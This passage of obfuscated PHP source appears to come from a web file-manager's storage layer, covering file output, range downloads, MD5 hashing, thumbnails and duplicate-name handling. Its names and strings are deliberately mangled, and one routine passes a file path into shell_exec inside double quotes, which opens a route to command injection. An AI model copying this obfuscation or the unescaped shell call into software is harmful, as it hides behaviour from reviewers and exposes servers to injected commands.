rtrim(get_path_father($™äèÙ‚Â), $üóƒˆÀ[8]) . $üóƒˆÀ[8]; foreach ($˜ÓÖíİÒ as $é—Êõè) { $šÃ›«İ¯ = array($üóƒˆÀ[94] => $é—Êõè[$üóƒˆÀ[94]], $üóƒˆÀ[96] => $é—Êõè[$üóƒˆÀ[94]], $üóƒˆÀ[85] => $é—Êõè[$üóƒˆÀ[85]]); if (isset($é—Êõè[$üóƒˆÀ[86]]) && !$é—Êõè[$üóƒˆÀ[85]]) { $šÃ›«İ¯[$üóƒˆÀ[86]] = $é—Êõè[$üóƒˆÀ[86]]; } if (isset($é—Êõè[$üóƒˆÀ[95]])) { $šÃ›«İ¯[$üóƒˆÀ[95]] = $é—Êõè[$üóƒˆÀ[95]]; } if (is_array($é—Êõè[$üóƒˆÀ[97]])) { $šÃ›«İ¯[$üóƒˆÀ[96]] = $é—Êõè[$üóƒˆÀ[97]][$üóƒˆÀ[94]]; $šÃ›«İ¯[$üóƒˆÀ[86]] = $é—Êõè[$üóƒˆÀ[97]][$üóƒˆÀ[86]]; $šÃ›«İ¯[$üóƒˆÀ[95]] = $é—Êõè[$üóƒˆÀ[97]][$üóƒˆÀ[95]]; } else { if (substr($é—Êõè[$üóƒˆÀ[94]], 0, strlen($™äèÙ‚Â)) == $™äèÙ‚Â) { $šÃ›«İ¯[$üóƒˆÀ[94]] = substr($é—Êõè[$üóƒˆÀ[94]], strlen($™äèÙ‚Â)); } } $†Äö„À = $é—Êõè[$üóƒˆÀ[85]] ? $üóƒˆÀ[8] : $üóƒˆÀ[12]; $šÃ›«İ¯[$üóƒˆÀ[96]] = rtrim($šÃ›«İ¯[$üóƒˆÀ[96]], $üóƒˆÀ[8]) . $†Äö„À; $šÃ›«İ¯[$üóƒˆÀ[94]] = $üóƒˆÀ[8] . trim($šÃ›«İ¯[$üóƒˆÀ[94]], $üóƒˆÀ[8]) . $†Äö„À; if (!$ÛªÀ¥ê™) { $µ’ˆÊáŸ = explode($üóƒˆÀ[8], trim($šÃ›«İ¯[$üóƒˆÀ[94]], $üóƒˆÀ[8])); $šÃ›«İ¯[$üóƒˆÀ[94]] = $üóƒˆÀ[8] . implode($üóƒˆÀ[8], array_slice($µ’ˆÊáŸ, 1)) . $†Äö„À; } $‡á›Ã––[] = $šÃ›«İ¯; } return array_sort_by($‡á›Ã––, $üóƒˆÀ[94]); } public function upload($Ôë¸ò›ë, $äë‹Î¡ , $Áî‹İ† = false, $à´Æ¢Â = REPEAT_REPLACE) { } public function uploadFileByID($ƒ• Ç•Ù, $ÁŠ€óÏŠ, $’¤÷Ùà€) { } public function uploadFileByPath($Á´ıª”Â, $¶Šîğãò, $Ú§Ò“ãè = array()) { } public function isUploadServer() { $Æùâç‡ú =& $_SERVER[ˆûùúÊ¯]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $Æùâç‡ú[98]) { return !0; } return $GLOBALS[$Æùâç‡ú[6]][$Æùâç‡ú[99]][$Æùâç‡ú[100]]; } public function isFileOutServer() { $ªö¼ö§· =& $_SERVER[ˆûùúÊ¯]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $ªö¼ö§·[98]) { return !0; } return $GLOBALS[$ªö¼ö§·[6]][$ªö¼ö§·[99]][$ªö¼ö§·[101]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($ü®æáÛ¯) { $Êîùû«û =& $_SERVER[ˆûùúÊ¯]; if (!$this->isCdnHost()) { return $ü®æáÛ¯; } return str_replace(trim(get_url_root($ü®æáÛ¯), $Êîùû«û[8]), trim($this->cdnHost, $Êîùû«û[8]), $ü®æáÛ¯); } public function uploadLink($³‹¦™Á, $Ø’º¶ = 0) { $ñ†İÎšœ =& $_SERVER[ˆûùúÊ¯]; if ($this->isUploadServer()) { return; } $¢òáŠ—ù = $this->getType(); if (!in_array($¢òáŠ—ù, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $ÌóïŞ = 1024 * 1024 * 10; $Ô†åàÛ£ = $Ø’º¶ <= $ÌóïŞ ? $ñ†İÎšœ[102] : $ñ†İÎšœ[103]; $ÌıÍ»‡ = (!$Ø’º¶ ? 1 : ceil($Ø’º¶ / pow(1024, 3))) * 3600 * 4; $½«°İî¡ = $this->{$Ô†åàÛ£}($³‹¦™Á, $ÌıÍ»‡); if ($½«°İî¡) { $½«°İî¡[$ñ†İÎšœ[104]] = $³‹¦™Á; $½«°İî¡[$ñ†İÎšœ[105]] = $¢òáŠ—ù; } return $½«°İî¡; } public function uploadFormData($Î¡ÒƒÀ´, $Á¦ÇÇùÄ = 3600) { } public function multiUploadFormData($Äµû…«, $ÔóáÑ§ = 3600) { } public function download($²‹á , $Ö‹Öš×İ) { } public function ext($ËÖûù) { $ÂííêÚ =& $_SERVER[ˆûùúÊ¯]; if (strpos($ËÖûù, $ÂííêÚ[8]) === -1) { $Ä”‘¾œÕ = $ËÖûù; } else { $Ä”‘¾œÕ = $this->pathThis($ËÖûù); } $¸é¯°À = $ÂííêÚ[12]; if (strstr($Ä”‘¾œÕ, $ÂííêÚ[10])) { $¸é¯°À = substr($Ä”‘¾œÕ, strrpos($Ä”‘¾œÕ, $ÂííêÚ[10]) + 1); $¸é¯°À = strtolower($¸é¯°À); } if (strlen($¸é¯°À) > 3 && preg_match($ÂííêÚ[106], $¸é¯°À, $í¼­¾ïÚ)) { $¸é¯°À = $ÂííêÚ[12]; } return $¸é¯°À; } public function pathThis($˜üäáª¬) { $ˆš¬ÑÙØ =& $_SERVER[ˆûùúÊ¯]; $˜üäáª¬ = str_replace($ˆš¬ÑÙØ[107], $ˆš¬ÑÙØ[8], rtrim($˜üäáª¬, $ˆš¬ÑÙØ[8])); $³ñ‘‹ï = strrpos($˜üäáª¬, $ˆš¬ÑÙØ[8]); if ($³ñ‘‹ï === !1) { return $˜üäáª¬; } return substr($˜üäáª¬, $³ñ‘‹ï + 1); } public function pathFather($Ïî·ëÀ) { $åÁˆ·¿ =& $_SERVER[ˆûùúÊ¯]; $Ïî·ëÀ = str_replace($åÁˆ·¿[107], $åÁˆ·¿[8], rtrim($Ïî·ëÀ, $åÁˆ·¿[8])); $ğ››ö½Ë = strrpos($Ïî·ëÀ, $åÁˆ·¿[8]); if ($ğ››ö½Ë === !1) { return $åÁˆ·¿[12]; } return substr($Ïî·ëÀ, 0, $ğ››ö½Ë + 1); } public function hashSimple($Ì“„”²¶) { $–…¼“íÀ =& $_SERVER[ˆûùúÊ¯]; if (!$Ì“„”²¶) { return md5($–…¼“íÀ[12]); } $ÙÑ‚ÁàÕ = $this->size($Ì“„”²¶); $Ì»Öğ‡õ = 200; $¥íŸïì = 50; if ($ÙÑ‚ÁàÕ <= $Ì»Öğ‡õ * $¥íŸïì) { return $this->hashMd5($Ì“„”²¶) . $ÙÑ‚ÁàÕ; } $»œñÉôµ = intval($ÙÑ‚ÁàÕ / $¥íŸïì); $ÁòÕ‡Ï = $–…¼“íÀ[12]; for ($×°¤¿ôî = 0; $×°¤¿ôî < $¥íŸïì; $×°¤¿ôî++) { $ÁòÕ‡Ï .= $this->fileSubstr($Ì“„”²¶, $»œñÉôµ * $×°¤¿ôî, $Ì»Öğ‡õ); } $ÁòÕ‡Ï .= $this->fileSubstr($Ì“„”²¶, $ÙÑ‚ÁàÕ - $Ì»Öğ‡õ, $Ì»Öğ‡õ); return md5($ÁòÕ‡Ï) . $ÙÑ‚ÁàÕ; } public static $md5Cache = array(); public function hashMd5($“ïšÖ¨£) { if (!$“ïšÖ¨£) { return md5($_SERVER[ˆûùúÊ¯][12]); } $“ïšÖ¨£ = $this->iconvSystem($“ïšÖ¨£); if (isset(self::$md5Cache[$“ïšÖ¨£])) { return self::$md5Cache[$“ïšÖ¨£]; } self::$md5Cache[$“ïšÖ¨£] = $this->hashMd5Shell($“ïšÖ¨£); if (!self::$md5Cache[$“ïšÖ¨£]) { self::$md5Cache[$“ïšÖ¨£] = @md5_file($“ïšÖ¨£); } return self::$md5Cache[$“ïšÖ¨£]; } private function hashMd5Shell($«‰ĞˆË·) { $ÈŸøÓÖ“ =& $_SERVER[ˆûùúÊ¯]; if (!$«‰ĞˆË·) { return md5($ÈŸøÓÖ“[12]); } if (!function_exists($ÈŸøÓÖ“[108])) { return !1; } $Œ³šµğŒ = array($ÈŸøÓÖ“[109], $ÈŸøÓÖ“[110]); $ë‡‡ÁôÓ = Cache::get($ÈŸøÓÖ“[111]); if (!$ë‡‡ÁôÓ) { $­Şüø›Ù = BASIC_PATH . $ÈŸøÓÖ“[112]; $†Ş–Àı½ = md5_file($­Şüø›Ù); $ë‡‡ÁôÓ = $ÈŸøÓÖ“[113]; foreach ($Œ³šµğŒ as $ü¶ù™Ÿş) { $Ü¦œÈÙ = shell_exec($ü¶ù™Ÿş . "\x20\x22{$­Şüø›Ù}\42"); if ($Ü¦œÈÙ && substr(trim($Ü¦œÈÙ), 0, 32) == $†Ş–Àı½) { $ë‡‡ÁôÓ = $ü¶ù™Ÿş; break; } } Cache::set($ÈŸøÓÖ“[111], $ë‡‡ÁôÓ, 3600); } if ($ë‡‡ÁôÓ == $ÈŸøÓÖ“[113]) { return !1; } $Ü¦œÈÙ = shell_exec($ë‡‡ÁôÓ . "\x20\x22{$«‰ĞˆË·}\x22"); $Ü¦œÈÙ = str_replace($ÈŸøÓÖ“[114], $ÈŸøÓÖ“[12], $Ü¦œÈÙ); return substr($Ü¦œÈÙ, 0, 32); } public function link($—¶“ôÄ«) { return $—¶“ôÄ«; } public function fileOut($¨ªĞ‚ìª, $Ù–˜˜˜ş = false, $‡­‘ö = false, $‘¾®ì´ = '') { $Œ™øŞ²€ =& $_SERVER[ˆûùúÊ¯]; $this->cacheMethod(null, null); if (!$¨ªĞ‚ìª || !$this->exist($¨ªĞ‚ìª)) { show_json(LNG($Œ™øŞ²€[115]), !1, $‡­‘ö); } $›ø¢°éÀ = $this->getType() == $Œ™øŞ²€[116]; $Ğ‹û“›¼ = $GLOBALS[$Œ™øŞ²€[6]][$Œ™øŞ²€[99]][$Œ™øŞ²€[117]][$Œ™øŞ²€[118]]; $¶•œÀãı = (double) $GLOBALS[$Œ™øŞ²€[6]][$Œ™øŞ²€[99]][$Œ™øŞ²€[117]][$Œ™øŞ²€[119]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $õã™˜í = $this->infoFull($¨ªĞ‚ìª); $Ñ•î›áÇ = $õã™˜í[$Œ™øŞ²€[86]]; $ºÙñ¾·Ñ = gmdate($Œ™øŞ²€[120], $õã™˜í[$Œ™øŞ²€[95]]); $ÁŒ´¥…– = $‡­‘ö ? $‡­‘ö : $this->iconvApp($õã™˜í[$Œ™øŞ²€[42]]); $ì¿êŒ›ç = 0; $‰Í¸ĞÔ = $Ñ•î›áÇ - 1; $ÎöÀ¿Ì× = $this->ext($ÁŒ´¥…–); if (in_array($ÎöÀ¿Ì×, array($Œ™øŞ²€[121], $Œ™øŞ²€[122], $Œ™øŞ²€[123], $Œ™øŞ²€[124]))) { $ÎöÀ¿Ì× = $Œ™øŞ²€[125]; } if (in_array($ÎöÀ¿Ì×, array($Œ™øŞ²€[126]))) { $ÎöÀ¿Ì× = $Œ™øŞ²€[127]; } if (!$‘¾®ì´) { $‘¾®ì´ = md5($ºÙñ¾·Ñ . $Ñ•î›áÇ); } $‘¾®ì´ = $Œ™øŞ²€[128] . $‘¾®ì´ . $Œ™øŞ²€[128]; $‚ëÎ²¯× = get_file_mime($ÎöÀ¿Ì×); $Î­”æ¯‹ = !0; $Î­”æ¯‹ = isset($_GET[$Œ™øŞ²€[129]]) ? !1 : !0; if ($Ù–˜˜˜ş === !1 && !mime_support($‚ëÎ²¯×)) { $‚ëÎ²¯× = $Œ™øŞ²€[130]; } header($Œ™øŞ²€[131]); header($Œ™øŞ²€[132] . $‚ëÎ²¯×); $›•Âùİ = rawurlencode($ÁŒ´¥…–); $›•Âùİ = $Œ™øŞ²€[128] . $›•Âùİ . $Œ™øŞ²€[133] . $›•Âùİ; if ($Ù–˜˜˜ş) { header($Œ™øŞ²€[134]); header($Œ™øŞ²€[135] . $›•Âùİ); } else { if ($Î­”æ¯‹) { header($Œ™øŞ²€[136] . $›•Âùİ); } } header($Œ™øŞ²€[137] . gmdate($Œ™øŞ²€[120], time() + 3600 * 24 * 30) . $Œ™øŞ²€[138]); header($Œ™øŞ²€[139]); header($Œ™øŞ²€[140]); header($Œ™øŞ²€[141]); if (isset($_SERVER[$Œ™øŞ²€[142]]) && strtotime($_SERVER[$Œ™øŞ²€[142]]) == $õã™˜í[$Œ™øŞ²€[95]]) { header($Œ™øŞ²€[143], !0, 304); die; } if (isset($_SERVER[$Œ™øŞ²€[144]]) && $_SERVER[$Œ™øŞ²€[144]] == $‘¾®ì´) { header($Œ™øŞ²€[145] . $‘¾®ì´, !0, 304); die; } header($Œ™øŞ²€[145] . $‘¾®ì´); header($Œ™øŞ²€[146] . $ºÙñ¾·Ñ . $Œ™øŞ²€[138]); header($Œ™øŞ²€[147] . $ÁŒ´¥…–); header($Œ™øŞ²€[148]); header($Œ™øŞ²€[149] . $Ñ•î›áÇ); header($Œ™øŞ²€[150]); if (!$Ù–˜˜˜ş && $ÎöÀ¿Ì× == $Œ™øŞ²€[151]) { if ($Ñ•î›áÇ > 1024 * 1024 * 5) { die; } $„Í—³‚ê = $this->getContent($¨ªĞ‚ìª); $„Í—³‚ê = Html::clearSVG($„Í—³‚ê); header($Œ™øŞ²€[152] . strlen($„Í—³‚ê)); echo $„Í—³‚ê; die; } $ÃĞ”°İ™ = strtolower($_SERVER[$Œ™øŞ²€[153]]); if ($›ø¢°éÀ && $ÃĞ”°İ™ && $Ğ‹û“›¼) { if (strstr($ÃĞ”°İ™, $Œ™øŞ²€[154])) { header($Œ™øŞ²€[155] . $¨ªĞ‚ìª); } else { if (strstr($ÃĞ”°İ™, $Œ™øŞ²€[156])) { header($Œ™øŞ²€[157] . $¨ªĞ‚ìª); } else { if (strstr($ÃĞ”°İ™, $Œ™øŞ²€[158])) { header($Œ™øŞ²€[159] . $¨ªĞ‚ìª); } } } if ($¶•œÀãı) { header($Œ™øŞ²€[160] . $¶•œÀãı); } return; } if (isset($_SERVER[$Œ™øŞ²€[161]])) { if (preg_match($Œ™øŞ²€[162], $_SERVER[$Œ™øŞ²€[161]], $„şÁ†¸›)) { $ì¿êŒ›ç = intval($„şÁ†¸›[1]); $ì¿êŒ›ç = $ì¿êŒ›ç <= 0 ? 0 : ($ì¿êŒ›ç >= $‰Í¸ĞÔ ? $‰Í¸ĞÔ : $ì¿êŒ›ç); if (!empty($„şÁ†¸›[2])) { $…®áÊ†£ = intval($„şÁ†¸›[2]); $‰Í¸ĞÔ = $…®áÊ†£ < $ì¿êŒ›ç ? $ì¿êŒ›ç : ($…®áÊ†£ >= $‰Í¸ĞÔ ? $‰Í¸ĞÔ : $…®áÊ†£); } } header($Œ™øŞ²€[163]); header("\x43\157\156\164\145\x6e\x74\x2d\x52\141\x6e\147\x65\72\x20\x62\171\x74\x65\163\x20{$ì¿êŒ›ç}\55{$‰Í¸ĞÔ}\x2f" . $Ñ•î›áÇ); } else { header($Œ™øŞ²€[164]); } header($Œ™øŞ²€[165]); $“Êºßü† = !0; if ($_SERVER[$Œ™øŞ²€[166]] == $Œ™øŞ²€[167] && $Ñ•î›áÇ > 1204 * 1024 * 1024 * 2) { $“Êºßü† = !1; } if ($“Êºßü†) { header($Œ™øŞ²€[168] . ($‰Í¸ĞÔ - $ì¿êŒ›ç + 1)); } if ($_SERVER[$Œ™øŞ²€[169]] == $Œ™øŞ²€[170]) { return; } $ÏÈŸ—ò¾ = 1024 * 100; $™ïæÂ‡› = 0; if ($¶•œÀãı) { $™ïæÂ‡› = intval(1000 * 1000 * ($ÏÈŸ—ò¾ / $¶•œÀãı)); } while ($ì¿êŒ›ç <= $‰Í¸ĞÔ) { $À»¼²‡Ğ = timeFloat(); check_abort(); $¿„ª²Ç = $‰Í¸ĞÔ - $ì¿êŒ›ç + 1; if ($¿„ª²Ç <= $ÏÈŸ—ò¾) { $ÏÈŸ—ò¾ = $¿„ª²Ç; } echo $this->fileSubstr($¨ªĞ‚ìª, $ì¿êŒ›ç, $ÏÈŸ—ò¾); $ì¿êŒ›ç += $ÏÈŸ—ò¾; if ($ÏÈŸ—ò¾ == $¿„ª²Ç) { $ì¿êŒ›ç = $‰Í¸ĞÔ + 1; } if ($™ïæÂ‡›) { $¹³ÓŒ‹Í = intval(1000 * 1000 * (timeFloat() - $À»¼²‡Ğ)); $›“ÅæÇ = $™ïæÂ‡› - $¹³ÓŒ‹Í; if ($›“ÅæÇ > 5) { usleep($›“ÅæÇ); } } } } public function fileOutServer($ı²¬³¥°, $—Êä‘÷ = false, $Ë“Å‡†Ö = false, $ºÖ”÷Æ± = '') { $this->fileOut($ı²¬³¥°, $—Êä‘÷, $Ë“Å‡†Ö, $ºÖ”÷Æ±); } public function fileOutLink($½œİÂÇã) { header($_SERVER[ˆûùúÊ¯][171] . $½œİÂÇã); die; } public function cacheMethod($±è•è×, $Ë±¸ïä¿, $ÄâõŒ¥å = null) { $²’©î½ =& $_SERVER[ˆûùúÊ¯]; static $“ŠØ›™Ù = array(); $şÍ‰¥ş = $Ë±¸ïä¿ ? ltrim($this->getPathOuter($Ë±¸ïä¿), $²’©î½[8]) : $²’©î½[12]; $ÖèÙéÇ¯ = $²’©î½[172] . $±è•è× . $²’©î½[173] . rtrim($şÍ‰¥ş, $²’©î½[8]); if (is_null($±è•è×)) { $“ŠØ›™Ù = array(); return; } if (is_null($Ë±¸ïä¿)) { foreach ($“ŠØ›™Ù as $ÖèÙéÇ¯ => $Ç¯•‚îá) { if (!strstr($ÖèÙéÇ¯, $²’©î½[172] . $±è•è× . $²’©î½[174])) { continue; } unset($“ŠØ›™Ù[$ÖèÙéÇ¯]); } return; } if (!is_null($ÄâõŒ¥å)) { $“ŠØ›™Ù[$ÖèÙéÇ¯] = $ÄâõŒ¥å; return; } $µËê¦Ä = isset($“ŠØ›™Ù[$ÖèÙéÇ¯]) ? $“ŠØ›™Ù[$ÖèÙéÇ¯] : null; if (!is_null($µËê¦Ä)) { return $µËê¦Ä; } $µËê¦Ä = $this->{$±è•è×}($Ë±¸ïä¿); $“ŠØ›™Ù[$ÖèÙéÇ¯] = $µËê¦Ä; return $µËê¦Ä; } public function cacheMethodInfoSet($ªŸæÍ, $¬æ†—Ï¹, $µÙ´Ìà¾ = false) { $ãìĞ”Ù =& $_SERVER[ˆûùúÊ¯]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($ãìĞ”Ù[175], $ªŸæÍ, $¬æ†—Ï¹); $this->cacheMethod($ãìĞ”Ù[176], $ªŸæÍ, $¬æ†—Ï¹ ? !1 : !0); if (is_array($µÙ´Ìà¾)) { $this->cacheMethod($ãìĞ”Ù[177], $ªŸæÍ, $µÙ´Ìà¾); } } public function fileOutImage($”…ø üõ, $‚¨¯×œ× = 250) { $õòˆŞô =& $_SERVER[ˆûùúÊ¯]; set_timeout(); if (substr($”…ø üõ, 0, 4) == $õòˆŞô[158]) { $this->fileOutLink($”…ø üõ); } $éÜäæÜ€ = $this->info($”…ø üõ); $˜•ßş†† = !1; $À¤æ¿¬’ = isset($GLOBALS[$õòˆŞô[178]]) ? $GLOBALS[$õòˆŞô[178]] : array(); if ($À¤æ¿¬’ && $À¤æ¿¬’[$õòˆŞô[179]] == $éÜäæÜ€[$õòˆŞô[94]]) { $éÜäæÜ€ = $À¤æ¿¬’; $£¹€ƒ‘ú = $éÜäæÜ€[$õòˆŞô[180]]; if ($£¹€ƒ‘ú && isset($£¹€ƒ‘ú[$õòˆŞô[181]])) { if ($£¹€ƒ‘ú[$õòˆŞô[181]] <= $‚¨¯×œ× && $£¹€ƒ‘ú[$õòˆŞô[182]] <= $‚¨¯×œ×) { $˜•ßş†† = !0; } } } if ($éÜäæÜ€[$õòˆŞô[86]] <= 1024 * 50 || $˜•ßş†† || !function_exists($õòˆŞô[183]) || $éÜäæÜ€[$õòˆŞô[184]] == $õòˆŞô[185]) { return $this->fileOut($”…ø üõ, !1, $éÜäæÜ€[$õòˆŞô[42]]); } $Ç¬Ãü• = kodIO::hashPath($éÜäæÜ€); $äæ™—å± = "\143\157\x76\x65\162\137{$Ç¬Ãü•}\137{$‚¨¯×œ×}\56\160\x6e\147"; $Ü©²·É— = IO_PATH_SYSTEM_TEMP . $õòˆŞô[186]; $šÅœûí§ = IO::infoFullSimple($Ü©²·É—); $“¬ê­ŠÒ = $šÅœûí§ && is_array($šÅœûí§) ? $šÅœûí§[$õòˆŞô[94]] : $õòˆŞô[12]; if (!$“¬ê­ŠÒ) { $“¬ê­ŠÒ = IO::mkdir($Ü©²·É—); } if ($éÜäæÜ€[$õòˆŞô[187]] == $õòˆŞô[188] && isset($éÜäæÜ€[$õòˆŞô[189]]) && $éÜäæÜ€[$õòˆŞô[189]] == kodIO::sourceID($“¬ê­ŠÒ)) { $²á´‘ß¾ = $éÜäæÜ€[$õòˆŞô[190]]; if ($‚¨¯×œ× <= 500) { $ôéÊéØµ = preg_replace($õòˆŞô[191], $õòˆŞô[192], $éÜäæÜ€[$õòˆŞô[42]]); $²á´‘ß¾ = IO::fileNameExist($“¬ê­ŠÒ, $ôéÊéØµ); } return IO::fileOut(KodIO::make($²á´‘ß¾), !1, $éÜäæÜ€[$õòˆŞô[42]]); } $’˜„¥ƒ¯ = IO::fileNameExist($“¬ê­ŠÒ, $äæ™—å±); if ($’˜„¥ƒ¯) { return IO::fileOut(KodIO::make($’˜„¥ƒ¯), !1, $éÜäæÜ€[$õòˆŞô[42]]); } if ($‚¨¯×œ× > 1000) { $this->makeImageCover($“¬ê­ŠÒ, $”…ø üõ, $äæ™—å±, $‚¨¯×œ×); $this->makeImageCover($“¬ê­ŠÒ, $”…ø üõ, "\x63\157\x76\145\162\137{$Ç¬Ãü•}\137\62\x35\x30\x2e\160\x6e\x67", 250); $’˜„¥ƒ¯ = IO::fileNameExist($“¬ê­ŠÒ, $äæ™—å±); if ($’˜„¥ƒ¯) { return IO::fileOut(KodIO::make($’˜„¥ƒ¯), !1, $éÜäæÜ€[$õòˆŞô[42]]); } die; } $µ€£Ÿü = Cache::get($äæ™—å±); if ($µ€£Ÿü == $õòˆŞô[193] || $µ€£Ÿü == $õòˆŞô[194]) { echo $µ€£Ÿü; die; } Cache::set($äæ™—å±, $õòˆŞô[194], 60); $¿§¶ƒªñ = array($“¬ê­ŠÒ, $éÜäæÜ€[$õòˆŞô[94]], $äæ™—å±, $‚¨¯×œ×); $„«ñ´ó¾ = $õòˆŞô[195] . $éÜäæÜ€[$õòˆŞô[86]] . $õòˆŞô[196] . $äæ™—å± . $õòˆŞô[197] . $éÜäæÜ€[$õòˆŞô[42]] . $õòˆŞô[198] . $éÜäæÜ€[$õòˆŞô[94]]; TaskQueue::add($õòˆŞô[199], $¿§¶ƒªñ, $„«ñ´ó¾, $äæ™—å±); } public function makeImageCover($÷ÜÕœ, $ñõ‡ÓÎ–, $œ¾­ûì÷, $ûº©İØ) { $Ã‹Ü«˜’ =& $_SERVER[ˆûùúÊ¯]; if (IO::fileNameExist($÷ÜÕœ, $œ¾­ûì÷)) { return $Ã‹Ü«˜’[200]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $Œé”üÉ« = DATA_THUMB . $œ¾­ûì÷; del_file($Œé”üÉ«); $Çç‹õ¦Î = TEMP_FILES . $œ¾­ûì÷; if (!@file_exists($Çç‹õ¦Î)) { $Çç‹õ¦Î = IO::download($ñõ‡ÓÎ–, $Çç‹õ¦Î); } if (!@file_exists($Çç‹õ¦Î)) { return $Ã‹Ü«˜’[201]; } ImageThumb::createThumb($Çç‹õ¦Î, $Œé”üÉ«, $ûº©İØ, $ûº©İØ * 10); if (@file_exists($Œé”üÉ«)) { Cache::remove($œ¾­ûì÷); return IO::move($Œé”üÉ«, $÷ÜÕœ); } Cache::set($œ¾­ûì÷, $Ã‹Ü«˜’[193], 600); del_file($Œé”üÉ«); return $Ã‹Ü«˜’[202] . $Çç‹õ¦Î . $Ã‹Ü«˜’[81]; } public function fileOutImageServer($Øë‡õË, $àş£‘«… = 250) { $this->fileOutImage($Øë‡õË, $àş£‘«…); } public function fileNameAuto($§¨ã¬, $¶ŒÇ–Ä, $òöÚÒ‚§ = REPEAT_RENAME, $Ú¯éõ = false) { $øÂ„ñ¦ø =& $_SERVER[ˆûùúÊ¯]; $ØŞä†¡ = $§¨ã¬ === $øÂ„ñ¦ø[12] ? $¶ŒÇ–Ä : rtrim($§¨ã¬, $øÂ„ñ¦ø[8]) . $øÂ„ñ¦ø[8] . $¶ŒÇ–Ä; if ($òöÚÒ‚§ == REPEAT_REPLACE || !$this->exist($ØŞä†¡) || $Ú¯éõ && $òöÚÒ‚§ != REPEAT_RENAME_FOLDER) { return $¶ŒÇ–Ä; } if ($òöÚÒ‚§ == REPEAT_SKIP) { return !1; } $çåë‡¦ğ = $øÂ„ñ¦ø[10] . get_path_ext($¶ŒÇ–Ä); $çåë‡¦ğ = $çåë‡¦ğ == $øÂ„ñ¦ø[10] || $Ú¯éõ ? $øÂ„ñ¦ø[12] : $çåë‡¦ğ; $öÌ‚š€ü = 1; $™”Ş¹¨º = substr($¶ŒÇ–Ä, 0, strlen($¶ŒÇ–Ä) - strlen($çåë‡¦ğ)); $¿Áìê†¼ = $™”Ş¹¨º . "\50{$öÌ‚š€ü}\x29{$çåë‡¦ğ}"; while ($this->exist(rtrim($§¨ã¬, $øÂ„ñ¦ø[8]) . $øÂ„ñ¦ø[8] . $¿Áìê†¼)) { $¿Áìê†¼ = $™”Ş¹¨º . "\x28{$öÌ‚š€ü}\x29{$çåë‡¦ğ}"; $öÌ‚š€ü++; } return $¿Áìê†¼; } private function fileNameAutoList($°â°Ö“İ, $ÆÂ¦Ôï, $şÊúñ´ = false) { $»£¾¾ÔŸ =& $_SERVER[ˆûùúÊ¯]; $®ƒ—×Ë¬ = $this->listPath($°â°Ö“İ, !0); $®ƒ—×Ë¬ = array_merge($®ƒ—×Ë¬[$»£¾¾ÔŸ[92]], $®ƒ—×Ë¬[$»£¾¾ÔŸ[93]]); $™œÊşşî = array_to_keyvalue($®ƒ—×Ë¬, $»£¾¾ÔŸ[12], $»£¾¾ÔŸ[42]); $†ë§‰€À = $»£¾¾ÔŸ[10] . get_path_ext($ÆÂ¦Ôï); $†ë§‰€À = $†ë§‰€À == $»£¾¾ÔŸ[10] || $şÊúñ´ ? $»£¾¾ÔŸ[12] : $†ë§‰€À; $Ïì·Ï†¤ = substr($ÆÂ¦Ôï, 0, strlen($ÆÂ¦Ôï) - strlen($†ë§‰€À)); $ÙæªĞÖù = $Ïì·Ï†¤ . "\50\x30\x29{$†ë§‰€À}"; for ($úæºéğù = 1; $úæºéğù <= count($™œÊşşî) + 1; $úæºéğù++) { $ÙæªĞÖù = $Ïì·Ï†¤ . "\x28{$úæºéğù}\51{$†ë§‰€À}"; if (!in_array_not_case($ÙæªĞÖù, $™œÊşşî)) { return $ÙæªĞÖù; } } return $ÙæªĞÖù; } public function listAllFiles($»èà´Ÿı, $šâ¹ğœª) { $¨­·ëœ =& $_SERVER[ˆûùúÊ¯]; if (empty($šâ¹ğœª)) { return array(); } $üè³×şù = array_keys($šâ¹ğœª); $à‡„ÃâÛ = array(); $»èà´Ÿı = trim($»èà´Ÿı, $¨­·ëœ[8]); foreach ($šâ¹ğœª as $ÖñÊõÖİ => $ø‘ô–Íî) { $ÍƒøÅÄÌ = ltrim(substr(trim($ÖñÊõÖİ, $¨­·ëœ[8]), strlen($»èà´Ÿı)), $¨­·ëœ[8]); if (substr($ÖñÊõÖİ, -1) == $¨­·ëœ[8]) { $ÍƒøÅÄÌ = rtrim($ÍƒøÅÄÌ, $¨­·ëœ[8]) . $¨­·ëœ[8]; } $à‡„ÃâÛ = array_merge($à‡„ÃâÛ, $this->slicePath($ÍƒøÅÄÌ)); } $ñÉØŞâü = array(); foreach (array_unique($à‡„ÃâÛ) as $ÈùßÄ„œ) { $ÒÕ—¦Êº = array($¨­·ëœ[94] => $this->getPathOuter($¨­·ëœ[8] . $»èà´Ÿı . $¨­·ëœ[8] . $ÈùßÄ„œ), $¨­·ëœ[85] => 1, $¨­·ëœ[86] => 0); if (substr($ÈùßÄ„œ, -1) != $¨­·ëœ[8]) { $ÒÕ—¦Êº[$¨­·ëœ[85]] = 0; $ó§Òâ½İ = $this->getPath($»èà´Ÿı . $¨­·ëœ[8] . $ÈùßÄ„œ); if (isset($šâ¹ğœª[$ó§Òâ½İ])) { $‚½öğ = $šâ¹ğœª[$ó§Òâ½İ]; if (isset($‚½öğ[$¨­·ëœ[86]])) { $ÒÕ—¦Êº[$¨­·ëœ[86]] = intval($‚½öğ[$¨­·ëœ[86]]); } if (isset($‚½öğ[$¨­·ëœ[203]])) { $ÒÕ—¦Êº[$¨­·ëœ[95]] = intval($‚½öğ[$¨­·ëœ[203]]); } } } $ñÉØŞâü[] = $ÒÕ—¦Êº; } return $ñÉØŞâü; } public function slicePath($í†‡‰Ô) { $ÊÊ¼¯ê¬ =& $_SERVER[ˆûùúÊ¯]; $ú±şı = explode($ÊÊ¼¯ê¬[8], trim($í†‡‰Ô, $ÊÊ¼¯ê¬[8])); $úÆ›‘ = 0; do { ++$úÆ›‘; $û³ı´ [] = implode($ÊÊ¼¯ê¬[8], array_slice($ú±şı, 0, $úÆ›‘)) . $ÊÊ¼¯ê¬[8]; } while ($úÆ›‘ < count($ú±şı)); $û³ı´ [count($ú±şı) - 1] = $í†‡‰Ô; return $û³ı´ ; } public function getHost() { $”™Àªá• =& 